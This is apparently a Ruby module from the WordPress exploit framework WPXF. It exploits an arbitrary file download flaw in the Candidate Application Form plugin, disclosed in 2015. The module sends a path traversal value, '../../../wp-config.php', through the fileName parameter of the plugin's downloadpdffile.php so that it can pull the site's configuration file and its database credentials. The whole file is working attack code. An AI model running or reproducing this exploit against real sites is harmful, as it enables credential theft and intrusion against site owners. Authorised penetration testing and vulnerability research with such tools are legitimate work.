class Wpxf::Auxiliary::CandidateApplicationFormArbitraryFileDownload < Wpxf::Module
  include Wpxf::WordPress::FileDownload

  def initialize
    super

    update_info(
      name: 'Candidate Application Form Arbitrary File Download',
      author: [
        'Larry W. Cashdollar',             # Disclosure
        'Rob Carr <rob[at]rastating.com>'  # WPXF module
      ],
      references: [
        ['EDB', '37754']
      ],
      date: 'Aug 10 2015'
    )
  end

  def check
    check_plugin_version_from_readme('candidate-application-form')
  end

  def default_remote_file_path
    '../../../wp-config.php'
  end

  def working_directory
    'wp-content/uploads/candidate_application_form/'
  end

  def downloader_url
    normalize_uri(wordpress_url_plugins, 'candidate-application-form', 'downloadpdffile.php')
  end

  def download_request_params
    { 'fileName' => remote_file, 'fileUrl' => Utility::Text.rand_alpha(5) }
  end
end
